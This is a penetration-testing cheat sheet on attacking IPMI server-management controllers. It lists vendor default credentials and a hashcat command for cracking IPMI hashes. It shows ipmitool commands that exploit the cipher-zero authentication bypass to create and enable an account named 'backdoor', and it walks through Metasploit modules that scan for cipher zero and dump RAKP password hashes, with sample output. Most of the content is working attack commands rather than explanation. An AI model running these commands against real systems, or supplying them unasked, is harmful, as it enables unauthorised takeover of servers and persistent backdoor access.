# IPMI

### Crack IPMI hash with hashcat

```
hashcat -a 3 -m 7300 -i --increment-min=8 --increment-max=8 ipmi.txt -1 ?d?u ?1?1?1?1?1?1?1?1 --username
```

### Default usernames and passwords

| **Product Name**                                    | **Default Username** | **Default Password**                     |
| --------------------------------------------------- | -------------------- | ---------------------------------------- |
| **HP Integrated Lights Out (iLO)**                  | Administrator        | \<factory randomized 8-character string> |
| **Dell Remote Access Card (iDRAC, DRAC)**           | root                 | calvin                                   |
| **IBM Integrated Management Module (IMM)**          | USERID               | PASSW0RD (with a zero)                   |
| **Fujitsu Integrated Remote Management Controller** | admin                | admin                                    |
| **Supermicro IPMI (2.0)**                           | ADMIN                | ADMIN                                    |
| **Oracle/Sun Integrated Lights Out Manager (ILOM)** | root                 | changeme                                 |
| **ASUS iKVM BMC**                                   | admin                | admin                                    |

### Tools

#### ipmitool

```
ipmitool -I lanplus -C 0 -H 172.16.24.246 -U root -P "" user list
ipmitool -I lanplus -C 0 -H 172.16.24.246 -U root -P "" chassis status
ipmitool -I lanplus -C 0 -H 172.16.28.249 -U root -P "" lan print
ipmitool -I lanplus -C 0 -H 172.16.28.249 -U root -P "" user set name 4 backdoor
ipmitool -I lanplus -C 0 -H 172.16.28.249 -U root -P "" user set password 4 Password123
ipmitool -I lanplus -C 0 -H 172.16.28.249 -U root -P "" user priv 2 4
ipmitool -I lanplus -C 0 -H 172.16.28.249 -U root -P "" channel setaccess 1 4 link=on
ipmitool -I lanplus -C 0 -H 172.16.28.249 -U root -P "" user enable 4
ipmitool -I lanplus -C 0 -H 172.16.28.249 -U root -P "" channel getaccess 1 4
```

#### ipmi\_cipher\_zerp (metasploit)

Dan Farmer identified a serious failing of the IPMI 2.0 specification, namely that cipher type 0, an indicator that the client wants to use clear-text authentication, actually allows access with any password. Cipher 0 issues were identified in HP, Dell, and Supermicro BMCs, with the issue likely encompassing all IPMI 2.0 implementations. It is easy to identify systems that have cipher 0 enabled using the ipmi\_cipher\_zero module in the Metasploit Framework.

```
msf> use auxiliary/scanner/ipmi/ipmi_cipher_zero
msf auxiliary(ipmi_cipher_zero) > set RHOSTS 10.0.0.0/24
msf auxiliary(ipmi_cipher_zero) > run

[*] Sending IPMI requests to 10.0.0.0->10.0.0.255 (256 hosts)
[+] 10.0.0.99:623 VULNERABLE: Accepted a session open request for cipher zero
[+] 10.0.0.132:623 VULNERABLE: Accepted a session open request for cipher zero
[+] 10.0.0.141:623 VULNERABLE: Accepted a session open request for cipher zero
[+] 10.0.0.153:623 VULNERABLE: Accepted a session open request for cipher zero
```

#### IPMI 2.0 RAKP authentication remote password hash retrieval

More recently, Dan Farmer identified an even bigger issue with the IPMI 2.0 specification. In short, the authentication process for IPMI 2.0 mandates that the server send a salted SHA1 or MD5 hash of the requested user's password to the client, prior to the client authenticating. You heard that right - the BMC will tell you the password hash for any valid user account you request. This password hash can broken using an offline bruteforce or dictionary attack. Since this issue is a key part of the IPMI specification, there is no easy path to fix the problem, short of isolating all BMCs into a separate network. The ipmi\_dumphashes module in the Metasploit Framework can make short work of most BMCs.

```
msf> use auxiliary/scanner/ipmi/ipmi_dumphashes
msf auxiliary(ipmi_dumphashes) > set RHOSTS 10.0.0.0/24
msf auxiliary(ipmi_dumphashes) > set THREADS 256

msf auxiliary(ipmi_dumphashes) > run
 
[+] 10.0.0.59 root:266ead5921000000....000000000000000000000000000000001404726f6f74:eaf2bd6a5 3ee18e3b2dfa36cc368ef3a4af18e8b
[+] 10.0.0.59 Hash for user 'root' matches password 'calvin'
[+] 10.0.0.59 :408ee18714000000d9cc....000000000000000000000000000000001400:93503c1b7af26abee 34904f54f26e64d580c050e
[+] 10.0.0.59 Hash for user '' matches password 'admin'
```

In the example above, the module was able to identify two valid user accounts (root and blank), retrieve the hmac-sha1 password hashes for these accounts, and automatically crack them using an internal wordlist. If a database is connected, Metasploit will automatically store the hashed and clear-text version of these credentials for future use. If a user's password is not found in the local dictionary of common passwords, an external password cracking program can be employed to quickly brute force possible options. The example below demonstrates how to write out John the Ripper and Hashcat compatible files.

```
msf auxiliary(ipmi_dumphashes) > set RHOSTS 10.0.1.0/24
msf auxiliary(ipmi_dumphashes) > set THREADS 256

msf auxiliary(ipmi_dumphashes) > set OUTPUT_JOHN_FILE out.john

msf auxiliary(ipmi_dumphashes) > set OUTPUT_HASHCAT_FILE out.hashcat

msf auxiliary(ipmi_dumphashes) > run

 

[+] 10.0.1.100 root:ee33c2e02700000....000000000000000000000000000000001404726f6f74:8c576f6532 356cc342591204f41cc4eab7da6e8a
```
